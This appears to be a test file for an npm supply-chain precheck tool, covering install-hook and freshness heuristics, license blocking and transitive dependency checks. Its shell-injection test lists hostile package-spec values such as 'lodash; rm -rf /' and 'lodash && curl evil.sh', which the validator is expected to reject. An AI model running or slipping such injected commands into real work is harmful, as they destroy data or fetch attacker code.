import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import {
  assessPackage,
  assertSafeSpec,
  parseResolvedPackageLock,
  precheck,
  KNOWN_MALICIOUS,
  FRESH_HOURS,
} from '../src/precheck/index.js';

const NOW = Date.parse('2026-08-04T12:00:00Z');
const hoursAgo = (h) => new Date(NOW - h * 36e5).toISOString();

/**
 * Build a packument with one version at a given age, optionally with hooks.
 * Defaults to an MIT license — real npm packuments almost always declare
 * one, and tests in this file that aren't about licensing shouldn't have to
 * think about it. Tests that ARE about licensing use packumentWithLicense.
 */
function packument(version, ageHours, scripts = {}) {
  return { time: { [version]: hoursAgo(ageHours) }, versions: { [version]: { scripts, license: 'MIT' } } };
}

/** Same shape, with a license string attached — the field classifyLicense reads. */
function packumentWithLicense(version, ageHours, license) {
  return { time: { [version]: hoursAgo(ageHours) }, versions: { [version]: { license } } };
}

describe('precheck: spec validation (shell-injection guard)', () => {
  it('accepts real package specs', () => {
    for (const s of ['lodash', 'lodash@4.17.21', '@scope/pkg', '@scope/pkg@^2.0.0', 'a-b.c~d']) {
      assert.doesNotThrow(() => assertSafeSpec(s), s);
    }
  });

  it('refuses anything with shell metacharacters', () => {
    for (const s of [
      'lodash; rm -rf /',
      'lodash && curl evil.sh',
      'a$(whoami)',
      'a`id`',
      'a|b',
      'a>out',
      'left-pad@1 | whoami',
      'left-pad@1 > owned.txt',
      'left-pad@1 || calc',
      'left-pad@1 < input.txt',
    ]) {
      assert.throws(() => assertSafeSpec(s), /not a valid npm package spec/, s);
    }
  });
});

describe('precheck: resolved lock parsing', () => {
  it('uses canonical registry names for npm aliases', () => {
    const packages = parseResolvedPackageLock({ packages: {
      'node_modules/string-width-cjs': { name: 'string-width', version: '4.2.3' },
    } });
    assert.deepEqual(packages, [{ name: 'string-width', version: '4.2.3' }]);
  });
  it('reads direct, scoped, and transitive packages from a lockfile', () => {
    const packages = parseResolvedPackageLock({
      packages: {
        '': { name: 'precheck', version: '1.0.0' },
        'node_modules/alpha': { version: '1.2.3' },
        'node_modules/@scope/beta': { version: '4.5.6' },
        'node_modules/alpha/node_modules/gamma': { version: '7.8.9' },
      },
    });
    assert.deepEqual(packages, [
      { name: 'alpha', version: '1.2.3' },
      { name: '@scope/beta', version: '4.5.6' },
      { name: 'gamma', version: '7.8.9' },
    ]);
  });

  it('fails closed when npm resolves no packages', () => {
    assert.throws(
      () => parseResolvedPackageLock({ packages: { '': { name: 'precheck', version: '1.0.0' } } }),
      /result is incomplete/,
    );
  });
});

describe('precheck: assessPackage', () => {
  it('BLOCKS a confirmed-malicious version outright', () => {
    const r = assessPackage({ name: 'keyv', version: '6.0.0' }, packument('6.0.0', 5000), NOW);
    assert.equal(r.level, 'block');
    assert.match(r.reasons[0], /CONFIRMED MALICIOUS/);
  });

  it('BLOCKS the hijack signature: freshly published AND runs install code', () => {
    const p = packument('9.9.9', 2, { postinstall: 'node setup.mjs' });
    const r = assessPackage({ name: 'anything', version: '9.9.9' }, p, NOW);
    assert.equal(r.level, 'block', 'new version + install hook is the exact account-takeover shape');
    assert.equal(r.installScripts.length, 1);
  });

  it('only WARNS on an install script in an established version', () => {
    const p = packument('0.25.12', 24 * 90, { postinstall: 'node install.js' });
    const r = assessPackage({ name: 'esbuild', version: '0.25.12' }, p, NOW);
    assert.equal(r.level, 'warn', 'esbuild legitimately builds a binary; do not block it');
  });

  it('only WARNS on a fresh version with no install script', () => {
    const r = assessPackage({ name: 'fast-mover', version: '2.0.1' }, packument('2.0.1', 3), NOW);
    assert.equal(r.level, 'warn');
    assert.match(r.reasons.join(' '), /published 3h ago/);
  });

  it('passes an established version with no install script', () => {
    const r = assessPackage({ name: 'lodash', version: '4.17.21' }, packument('4.17.21', 24 * 400), NOW);
    assert.equal(r.level, 'ok');
    assert.equal(r.reasons.length, 0);
  });

  it('treats the freshness boundary as intended', () => {
    const just = assessPackage({ name: 'x', version: '1.0.0' }, packument('1.0.0', FRESH_HOURS - 1), NOW);
    const past = assessPackage({ name: 'x', version: '1.0.0' }, packument('1.0.0', FRESH_HOURS + 1), NOW);
    assert.equal(just.level, 'warn');
    assert.equal(past.level, 'ok');
  });

  it('does not claim a package is fine when the registry gave no date', () => {
    // versions carries a license so this test isolates the age signal specifically —
    // a missing license is its own (correctly separate) finding, tested above.
    const r = assessPackage({ name: 'x', version: '1.0.0' }, { time: {}, versions: { '1.0.0': { license: 'MIT' } } }, NOW);
    assert.equal(r.ageHours, null);
    assert.equal(r.level, 'block', 'unknown age must not bypass fresh-release review');
  });

  it('BLOCKS metadata that points the artifact at a different host', () => {
    const p = packument('1.2.3', 5000);
    p.versions['1.2.3'].dist = {
      tarball: 'https://copycat.example/pkg-1.2.3.tgz',
      integrity: 'sha512-safe-looking-value',
    };
    const r = assessPackage({ name: 'pkg', version: '1.2.3' }, p, NOW);
    assert.equal(r.level, 'block');
    assert.match(r.reasons.join(' '), /untrusted host/);
  });
});

describe('precheck: assessPackage license contamination', () => {
  it('BLOCKS a strong-copyleft package with no permissive escape, same tier as confirmed-malicious', () => {
    const p = packumentWithLicense('1.0.0', 24 * 400, 'GPL-3.0-or-later');
    const r = assessPackage({ name: 'copyleft-thing', version: '1.0.0' }, p, NOW);
    assert.equal(r.level, 'block');
    assert.match(r.reasons.join(' '), /license: .*strong or network copyleft/);
  });

  it('BLOCKS AGPL, the one that catches hosted SaaS specifically', () => {
    const p = packumentWithLicense('1.0.0', 24 * 400, 'AGPL-3.0-only');
    assert.equal(assessPackage({ name: 'x', version: '1.0.0' }, p, NOW).level, 'block');
  });

  it('only WARNS on a dual-licensed GPL package — the permissive branch is electable', () => {
    const p = packumentWithLicense('1.0.0', 24 * 400, '(MIT OR GPL-3.0-or-later)');
    const r = assessPackage({ name: 'jszip', version: '1.0.0' }, p, NOW);
    assert.equal(r.level, 'warn');
  });

  it('only WARNS on weak copyleft (LGPL/MPL) — fine unmodified as a dependency', () => {
    const p = packumentWithLicense('1.0.0', 24 * 400, 'LGPL-3.0-or-later');
    assert.equal(assessPackage({ name: 'x', version: '1.0.0' }, p, NOW).level, 'warn');
  });

  it('does not silently pass an undeclared license', () => {
    const p = packumentWithLicense('1.0.0', 24 * 400, undefined);
    const r = assessPackage({ name: 'x', version: '1.0.0' }, p, NOW);
    assert.equal(r.level, 'warn');
    assert.match(r.reasons.join(' '), /no license declared/);
  });

  it('never downgrades a block from the malware checks because the license happens to be clean', () => {
    const p = { time: { '9.9.9': hoursAgo(2) }, versions: { '9.9.9': { scripts: { postinstall: 'x' }, license: 'MIT' } } };
    const r = assessPackage({ name: 'anything', version: '9.9.9' }, p, NOW);
    assert.equal(r.level, 'block', 'hijack signature must still block regardless of license');
  });

  it('escalates an otherwise-clean package to block on license alone', () => {
    const p = { time: { '1.0.0': hoursAgo(24 * 400) }, versions: { '1.0.0': { scripts: {}, license: 'GPL-2.0-only' } } };
    const r = assessPackage({ name: 'clean-but-gpl', version: '1.0.0' }, p, NOW);
    assert.equal(r.level, 'block');
    assert.equal(r.installScripts.length, 0, 'no install-script reason, the block is purely the license');
  });

  it('adds no reason for an ordinary permissive license', () => {
    const p = packumentWithLicense('1.0.0', 24 * 400, 'MIT');
    const r = assessPackage({ name: 'x', version: '1.0.0' }, p, NOW);
    assert.equal(r.level, 'ok');
    assert.equal(r.reasons.length, 0);
  });
});

describe('precheck: whole-tree behaviour', () => {
  // The Mini Shai-Hulud packages were TRANSITIVE. Checking only the typed
  // package would have missed the incident completely.
  it('judges transitive dependencies, not just the package you typed', async () => {
    const resolve = () => [
      { name: 'innocent-wrapper', version: '1.0.0' },
      { name: 'keyv', version: '6.0.0' }, // arrives underneath, never typed
    ];
    const fetchImpl = async (url, options) => url.endsWith('/querybatch') ? new Response(JSON.stringify({ results: JSON.parse(options.body).queries.map(() => ({})) })) : ({
      ok: true,
      json: async () =>
        url.includes('keyv') ? packument('6.0.0', 4) : packument('1.0.0', 24 * 300),
    });
    const report = await precheck('innocent-wrapper', { resolve, fetchImpl, nowMs: NOW });
    assert.equal(report.exitCode, 2);
    assert.equal(report.blocked.length, 1);
    assert.equal(report.blocked[0].name, 'keyv');
  });

  it('blocks a registry failure because the review is incomplete', async () => {
    const resolve = () => [{ name: 'x', version: '1.0.0' }];
    const fetchImpl = async () => ({ ok: false, status: 500, json: async () => ({}) });
    const report = await precheck('x', { resolve, fetchImpl, nowMs: NOW });
    assert.equal(report.exitCode, 2);
    assert.match(report.blocked[0].reasons[0], /could not reach the registry/);
  });

  it('exits 0 only when every package in the tree is clean', async () => {
    const resolve = () => [{ name: 'a', version: '1.0.0' }, { name: 'b', version: '2.0.0' }];
    const fetchImpl = async (url, options) => url.endsWith('/querybatch') ? new Response(JSON.stringify({ results: JSON.parse(options.body).queries.map(() => ({})) })) : ({
      ok: true,
      json: async () => (url.includes('/a') ? packument('1.0.0', 24 * 200) : packument('2.0.0', 24 * 200)),
    });
    const report = await precheck('a', { resolve, fetchImpl, nowMs: NOW });
    assert.equal(report.exitCode, 0);
  });

  it('has the real incident versions on the known-bad list', () => {
    for (const v of ['keyv@6.0.0', 'file-entry-cache@11.1.6', 'cacheable-request@13.0.20']) {
      assert.ok(KNOWN_MALICIOUS.has(v), v);
    }
  });
});

describe('precheck: closeAndSetExitCode', () => {
  it('sets process.exitCode and does not call process.exit', async () => {
    const { closeAndSetExitCode } = await import('../src/precheck/close-and-exit.js');
    const prev = process.exitCode;
    const original = process.exit;
    let called = false;
    process.exit = () => {
      called = true;
    };
    try {
      await closeAndSetExitCode(0);
      assert.equal(process.exitCode, 0);
      assert.equal(called, false);
    } finally {
      process.exit = original;
      process.exitCode = prev;
    }
  });
});
